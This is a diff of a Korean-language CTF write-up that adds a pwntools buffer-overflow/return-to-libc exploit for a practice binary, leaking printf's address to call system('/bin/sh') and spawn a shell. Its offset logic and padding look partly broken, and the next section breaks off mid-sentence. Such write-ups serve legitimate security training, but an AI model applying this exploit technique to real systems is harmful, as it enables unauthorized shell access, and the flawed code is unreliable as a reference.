@@ -27,20 +27,43 @@ p.interactive()
 ROP 문제로, 주어진 one gadget을 활용할 수 있다.
 
 
-
-
 ```python
 
+from pwn import *
 
+p = process('./onegadget')
+e = ELF('./onegadget')
+
+binsh = 0x68732f6e6962
+
+p.recvuntil(b'printf Function is at: ')
+printf_addr = int(p.recv(14), 16)
+
+
+libc_base = printf_addr - e.symbols['printf']
+
+system_addr = libc_base + e.symbols['system']
+binsh = libc_base + list(e.search('/bin/sh'))[0]
+
+log.info("system addr : %s"%hex(system_addr))
+
+payload = b'A'*0x20
+payload += b'B'*0x4
+payload += p64(system_addr)
+payload += b'C'*0x4
+payload += p64(binsh)
+
+p.sendline(payload)
+
+p.interactive()
 
 ```
 
 
 
-
 ## problem 3-2
 
-
+마찬가지로 ROP 문제이다. read를 활용하여 
 
 
 ## problem 4
